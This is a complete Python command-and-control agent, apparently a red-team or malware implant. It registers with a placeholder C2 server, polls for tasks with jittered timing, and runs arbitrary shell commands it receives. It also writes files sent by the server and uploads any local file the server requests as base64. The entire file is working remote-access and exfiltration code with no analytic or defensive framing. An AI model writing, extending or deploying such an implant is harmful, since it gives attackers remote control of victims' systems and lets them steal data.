import time
import requests
import subprocess
import base64
import json
import os
import random

C2_SERVER_IP = "http://C2-SERVER-IP:80"
AUTH_KEY = "MySecretKey123"
POLL_INTERVAL = 2

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {AUTH_KEY}"})


def send_result(agent_id, data):
    try:
        session.post(
            f"{C2_SERVER_IP}/result/{agent_id}",
            data=data.encode("utf-8", "replace"),
            timeout=5
        )
    except Exception:
        pass


# register new agent
while True:
    try:
        r = session.post(f"{C2_SERVER_IP}/register", timeout=5)
        agent_id = r.json()["agent_id"]
        break
    except Exception:
        time.sleep(3)


# main loop
while True:
    try:
        r = session.get(f"{C2_SERVER_IP}/task/{agent_id}", timeout=5)
        task = r.json().get("task")
    except Exception:
        time.sleep(POLL_INTERVAL)
        continue

    if not task:
        time.sleep(POLL_INTERVAL + random.random() * 0.5)
        continue

    # JSON tasks (put/get)
    parsed = None
    try:
        parsed = json.loads(task)
    except Exception:
        pass

    if isinstance(parsed, dict):
        task_type = parsed.get("type")

        # PUT (server -> agent)
        if task_type == "put":
            filename = parsed.get("filename")
            data = parsed.get("data")

            if filename and data:
                try:
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(data))
                    send_result(agent_id, f"[PUT] Saved file: {filename}")
                except Exception as e:
                    send_result(agent_id, f"[PUT ERROR] {e}")
            else:
                send_result(agent_id, "[PUT ERROR] Invalid JSON payload")

            time.sleep(POLL_INTERVAL + random.random() * 0.5)
            continue

        # GET (agent -> server)
        if task_type == "get":
            path = parsed.get("path")

            if not path or not os.path.isfile(path):
                send_result(agent_id, f"[GET ERROR] File not found: {path}")
                time.sleep(POLL_INTERVAL + random.random() * 0.5)
                continue

            try:
                with open(path, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode()

                payload = json.dumps({
                    "type": "file",
                    "filename": os.path.basename(path),
                    "data": b64
                })

                send_result(agent_id, payload)
            except Exception as e:
                send_result(agent_id, f"[GET ERROR] {e}")

            time.sleep(POLL_INTERVAL + random.random() * 0.5)
            continue

    # normal shell command
    try:
        proc = subprocess.run(
            task,
            shell=True,
            capture_output=True,
            text=True
        )
        output = proc.stdout + proc.stderr
    except Exception as e:
        output = f"Execution error: {e}"

    send_result(agent_id, output)
    time.sleep(POLL_INTERVAL + random.random() * 0.5)
